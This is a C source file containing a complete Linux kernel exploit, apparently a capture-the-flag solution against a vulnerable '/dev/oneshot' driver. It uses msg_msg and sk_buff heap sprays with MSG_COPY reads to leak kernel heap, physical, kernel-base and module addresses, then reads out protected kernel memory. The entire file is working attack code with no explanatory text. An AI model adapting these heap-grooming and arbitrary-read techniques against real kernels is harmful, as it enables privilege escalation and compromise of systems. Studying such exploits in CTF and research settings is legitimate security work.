#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <x86intrin.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>

int fd;
unsigned long kbase, koff, physbase, kheap;
unsigned long user_cs, user_ss, user_sp, user_rflags;
cpu_set_t pwn_cpu;

void fatal(const char* msg){
    perror(msg);
    exit(1);
}

void view_data(void *addr, int size){
    for (size_t i = 0; i < size; i+=0x10)
    {
        printf("0x%04lx 0x%016lx 0x%016lx\n",i,*(unsigned long*)(addr+i),*(unsigned long*)(addr+i+0x08));
    }
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void pin_cpu(int cpu)
{
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    sched_setaffinity(0, sizeof(my_set), &my_set);
}

// msg utils
# define MSG_COPY	040000
typedef struct{
    long type;
    char text[0x2000];
} msg_buf;

int make_queue(){
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
{
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
    {
        perror("msgrcv");
        exit(-1);
    }
    return;
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
{
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
    {
        perror("msgsend failure");
        exit(-1);
    }
    return;
}

// SkBuff utils
#define SK_BUFF_NUM				 0x8
void init_sockets(int sock_pair[2]){
    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sock_pair)){
        perror("socketpair");
        exit(-1);
    }
}

void alloc_skbuff(int socks[2], char *buf, int size){
    for (size_t i = 0; i < SK_BUFF_NUM; i++){
        if(write(socks[0], buf, size) != size)
            fatal("write");
    }
}

void free_skbuff(int socks[2], char *buf, int size){
    for (int j = 0; j < SK_BUFF_NUM; j++) {
        if (read(socks[1], buf, size) < 0)
            fatal("read");
    }
}

void add_chunk(char *buf){
    if(ioctl(fd, 0x13370001, buf) < 0)
        fatal("ioctl");
}

void del_chunk(){
    if(ioctl(fd, 0x13370002, 0) < 0)
        fatal("ioctl");
}

int main(){
    save_state();
    pin_cpu(0);

    int msgqid[0x40];
    for (size_t i = 0; i < 0x40; i++)
        msgqid[i] = make_queue();

    int socks[0x30][2];
    for (size_t i = 0; i < 0x30; i++)
        init_sockets(socks[i]);

    fd = open("/dev/oneshot", O_RDONLY);

    msg_buf msg;
    msg.type = 1;
    memset(msg.text, 0x0, 0x2000);
    for(size_t i = 0; i < 0x10; i++)
        send_msg(msgqid[i], &msg, 0x1000 - 0x30, 0);

    char *buf = malloc(0x1000);
    memset(buf, 0x41, 0x1000);
    add_chunk(buf);

    printf("Chunk added\n");
    del_chunk();

    for(size_t i = 0; i < 0x10; i++)
        send_msg(msgqid[i+0x10], &msg, 0x1000 - 0x30, 0);

    del_chunk();
    printf("Msg received\n");

    uint64_t *ptr = (uint64_t*)(msg.text + 0x1000 - 0x30);
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0x1;
    *ptr++ = 0x1000-0x30 + 0x8;
    *ptr++ = 0xfffffe0000000000 + 4;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0xdeadbeef;

    printf("Msg prepared\n");

    for(size_t i = 0; i < 0x10; i++)
        send_msg(msgqid[i+0x20], &msg, 0x2000 - 0x30 - 0x8, 0);

    del_chunk();
    get_msg(msgqid[0], &msg, 0x2000 - 0x30 - 0x8, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);

    int msg_no = -1;

    for (size_t i = 0; i < 0x10; i++){
        memset(msg.text, 0x0, 0x2000);
        get_msg(msgqid[i+0x20], &msg, 0x2000, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
        if(*(uint64_t*)(msg.text + 0x1000 - 0x30 + 0x18) != 0xfffffe0000000000 + 4){
            msg_no = i;
            break;
        }
    }

    if(msg_no == -1){
        printf("Failed to get the msg\n");
        return -1;
    }

    kheap = *(uint64_t*)(msg.text + 0x1000 - 0x30 + 0x18); 
    physbase = (kheap >> 28) << 28;

    printf("[+] Kheap: 0x%016lx\n", kheap);
    printf("[+] Physbase: 0x%016lx\n", physbase);
    printf("[+] Leak: 0x%016lx\n", physbase + 0x9d000);

    get_msg(msgqid[0x1], &msg, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
    memset(msg.text, 0x0, 0x2000);

    ptr = (uint64_t*)(msg.text + 0x1000 - 0x30);
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0x1;
    *ptr++ = 0x1000-0x30 + 0x100;
    *ptr++ = physbase + 0x9d000 - 0x18;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0xdeadbeef;


    for (size_t i = 0; i < 0x10; i++){
        memset(msg.text, 0x70+i, 0x20);
        send_msg(msgqid[i+0x30], &msg, 0x2000 - 0x30 - 0x8, 0);
    }

    int aux_msg_no = -1;
    for(size_t i = 0; i < 0x10; i++){
        memset(msg.text, 0x0, 0x2000);
        get_msg(msgqid[i+0x10], &msg, 0x2000 - 0x30 - 0x8, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
        if(*(uint64_t*)(msg.text + 0x1000 - 0x30) != 0){
            aux_msg_no = i;
            break;
        }
    }

    // view_data(msg.text + 0x1000 - 0x30, 0x100);

    kbase = *(uint64_t*)(msg.text + 0x1000 - 0x30 + 0x10) - 0x2eb30;
    koff = kbase - 0xffffffff81000000;
    printf("[+] Kbase: 0x%016lx\n", kbase);

    get_msg(msgqid[msg_no + 0x20], &msg, 0x2000 - 0x30 - 0x8, 0, IPC_NOWAIT | MSG_NOERROR);
    // get_msg(msgqid[0x2], &msg, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);

    memset(msg.text, 0x0, 0x2000);
    // ptr = (uint64_t*)(msg.text + 0x1000 - 0x30);
    memset(buf, 0x0, 0x1000);
    ptr = (uint64_t *)buf;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0x1;
    *ptr++ = 0x1000-0x30 + 0x100;
    *ptr++ = 0xffffffff82b3e950 + koff;
    *ptr++ = kheap;
    *ptr++ = 0xdeadbeef;

    // for (size_t i = 0; i < 0x2; i++)
    alloc_skbuff(socks[0], buf, 0x1000 - 320);
    
    send_msg(msgqid[msg_no + 0x20], &msg, 0x2000 - 0x30 - 0x8, 0);
    printf("SkBuff allocated\n");
    // getchar();
    
    memset(msg.text, 0x0, 0x2000);
    get_msg(msgqid[aux_msg_no + 0x10], &msg, 0x2000 - 0x30 - 0x8, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
    // view_data(msg.text + 0x1000 - 0x30, 0x100);


    uint64_t kmod = *(uint64_t*)(msg.text + 0x1000 - 0x30 + 0x30) - 0x2208;
    printf("[+] Kmod: 0x%016lx\n", kmod);

    free_skbuff(socks[0], buf, 0x1000 - 320);
    memset(buf, 0x0, 0x1000);
    
    ptr = (uint64_t *)buf;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0xffffffffff5fb000 + 0x1000;
    *ptr++ = 0x1;
    *ptr++ = 0x1000-0x30 + 0x100;
    *ptr++ = kmod + 0x2100;
    *ptr++ = kheap;
    *ptr++ = 0xdeadbeef;

    alloc_skbuff(socks[0], buf, 0x1000 - 320);
    get_msg(msgqid[aux_msg_no + 0x10], &msg, 0x2000 - 0x30 - 0x8, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
    printf("%s\n", msg.text + 0x1000 - 0x30 + 0xb8);

    printf("end\n");
    getchar();
    return 0;
}
